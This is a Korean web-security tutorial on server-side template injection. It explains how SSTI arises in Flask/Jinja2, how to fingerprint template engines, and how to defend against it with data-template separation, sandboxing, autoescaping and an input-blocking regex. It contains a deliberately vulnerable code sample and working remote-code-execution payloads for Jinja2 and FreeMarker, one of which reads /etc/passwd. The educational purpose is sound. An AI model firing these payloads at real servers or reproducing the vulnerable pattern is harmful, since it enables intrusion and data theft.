---
title: "템플릿 인젝션(SSTI): 서버 사이드 코드 실행 취약점"
description: "SSTI(Server-Side Template Injection)의 공격 원리와 Jinja2·Twig·FreeMarker 엔진별 탐지·익스플로잇 기법을 설명하고, 데이터-템플릿 분리·SandboxedEnvironment·자동 이스케이프로 구성된 방어 전략을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-03"
archiveOrder: 9
type: "knowledge"
category: "Security"
tags: ["SSTI", "템플릿인젝션", "Jinja2", "RCE", "Flask", "웹보안"]
featured: false
draft: false
---

[지난 글](/posts/websec-command-injection/)에서 OS 명령어를 직접 탈취하는 커맨드 인젝션을 다뤘다. 이번 글에서는 인젝션 계열의 마지막으로 **SSTI(Server-Side Template Injection)**를 살펴본다. 템플릿 엔진을 통해 서버에서 임의 코드를 실행한다는 점에서 커맨드 인젝션과 동일한 파괴력을 지니지만, 공격 벡터와 메커니즘이 전혀 다르다.

## SSTI란

웹 프레임워크는 HTML을 동적으로 생성하기 위해 템플릿 엔진을 사용한다(Jinja2, Twig, FreeMarker 등). SSTI는 **사용자 입력이 템플릿의 데이터 자리에 들어가는 것이 아니라 템플릿 자체로 처리**될 때 발생한다.

```python
# 전형적인 취약 코드 (Flask + Jinja2)
from flask import request, render_template_string

@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    # name을 데이터가 아닌 템플릿 문자열로 삽입
    template = f"<h1>Hello, {name}!</h1>"  # 위험!
    return render_template_string(template)
```

`?name={{7*7}}`를 요청하면 Jinja2가 수식을 평가해 `49`가 반환된다. 이것이 SSTI 탐지의 시작이다.

## 탐지와 엔진 판별

![SSTI 공격 패턴](/assets/posts/websec-template-injection-attack.svg)

수식 삽입 페이로드로 취약 여부를 확인하고, 엔진별 동작 차이로 사용 중인 템플릿 엔진을 판별한다.

```
{{7*7}}      → 49가 출력되면: Twig, Jinja2, Smarty 등 후보
{{7*'7'}}    → 7777777: Jinja2 (Python 문자열 반복)
{{7*'7'}}    → 49:      Twig (PHP 숫자 연산)
${7*7}       → 49:      FreeMarker (Java)
<%= 7*7 %>   → 49:      ERB (Ruby)
```

## Jinja2 RCE 익스플로잇

Jinja2는 Python의 내부 클래스 계층에 접근할 수 있어 RCE까지 이어진다.

```
# Python 오브젝트 계층 탐색
{{''.__class__}}                              → <class 'str'>
{{''.__class__.__mro__}}                     → str의 MRO 체인
{{''.__class__.__mro__[1].__subclasses__()}} → object의 모든 서브클래스

# subprocess.Popen을 찾아 명령 실행 (클래스 인덱스는 버전마다 다름)
{{''.__class__.__mro__[1].__subclasses__()[xxx]('id', shell=True, stdout=-1).communicate()}}

# 더 짧은 페이로드 (Jinja2 globals 접근)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## FreeMarker (Java) 익스플로잇

```
# FreeMarker 서버 사이드 실행
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("cat /etc/passwd")}
```

## 방어 전략

핵심 원칙: **사용자 입력은 절대 템플릿 문자열로 처리하지 않는다**.

![SSTI 방어 코드](/assets/posts/websec-template-injection-defense.svg)

### 1. 데이터-템플릿 엄격 분리

```python
# ❌ 위험: 사용자 입력을 템플릿에 직접 삽입
template_str = f"안녕하세요, {user_name}님"
render_template_string(template_str)

# ✅ 안전: 템플릿은 정적, 사용자 입력은 변수로만
# 코드베이스의 고정 템플릿 파일 사용
return render_template('greet.html', user_name=user_name)

# render_template_string이 꼭 필요하면:
STATIC_TEMPLATE = "안녕하세요, {{ user_name }}님"
return render_template_string(STATIC_TEMPLATE, user_name=user_name)
```

### 2. Jinja2 SandboxedEnvironment

사용자가 커스텀 템플릿을 작성할 수 있는 기능(이메일 템플릿, 리포트 빌더)에서는 샌드박스를 사용한다.

```python
from jinja2.sandbox import SandboxedEnvironment
from jinja2 import select_autoescape

env = SandboxedEnvironment(
    autoescape=select_autoescape(['html', 'xml']),
    # 위험 속성 차단
)

def render_user_template(user_template: str, context: dict) -> str:
    # 샌드박스 환경에서 렌더링
    # __class__, __mro__, __subclasses__ 등 접근 차단됨
    try:
        template = env.from_string(user_template)
        return template.render(**context)
    except Exception as e:
        raise TemplateError("템플릿 처리 오류") from e
```

**주의**: SandboxedEnvironment도 우회 방법이 존재한다. 가능하면 사용자 정의 템플릿 기능 자체를 설계에서 제거하는 것이 가장 안전하다.

### 3. 자동 이스케이프 활성화

```python
from jinja2 import Environment, FileSystemLoader, select_autoescape

# HTML 자동 이스케이프 활성화
jinja_env = Environment(
    loader=FileSystemLoader('templates'),
    autoescape=select_autoescape(['html', 'xml', 'jinja2']),
)
```

### 4. 입력 길이와 문자 제한

템플릿 구문(`{{`, `}}`, `${`, `<#`)이 포함된 입력을 차단한다.

```python
import re

TEMPLATE_SYNTAX_PATTERN = re.compile(
    r'\{\{|\}\}|\$\{|\{%|%\}|<#|#>|<%|%>',
    re.IGNORECASE
)

def sanitize_template_input(value: str, max_length: int = 500) -> str:
    if len(value) > max_length:
        raise ValueError("입력이 너무 깁니다")
    if TEMPLATE_SYNTAX_PATTERN.search(value):
        raise ValueError("허용되지 않는 문자 포함")
    return value
```

## Node.js (Handlebars, Pug)

```javascript
// Handlebars — 삼중 중괄호 사용 금지
// {{name}}    → 자동 이스케이프 (안전)
// {{{name}}}  → 원시 HTML 출력 (XSS/SSTI 위험)

// Pug — 사용자 입력을 템플릿 문자열에 삽입 금지
// ❌ 위험
const html = pug.render(`h1 Hello, ${userInput}!`);
// ✅ 안전
const html = pug.render('h1 Hello, #{name}!', { name: userInput });
```

SSTI는 커맨드 인젝션만큼 위험하지만 더 미묘하게 발생한다. 프레임워크를 사용할 때 **템플릿 렌더링 함수에 사용자 입력이 직접 들어가는 경로가 없는지** 항상 코드 리뷰에서 확인해야 한다. 다음 글에서는 브라우저에서 악성 스크립트를 실행시키는 XSS 취약점을 총괄 개요부터 살펴본다.

---

**지난 글:** [커맨드 인젝션: OS 명령어 탈취 공격과 방어](/posts/websec-command-injection/)

**다음 글:** [XSS 완전 정복: 크로스 사이트 스크립팅 개요](/posts/websec-xss-overview/)

<br>
읽어주셔서 감사합니다. 😊
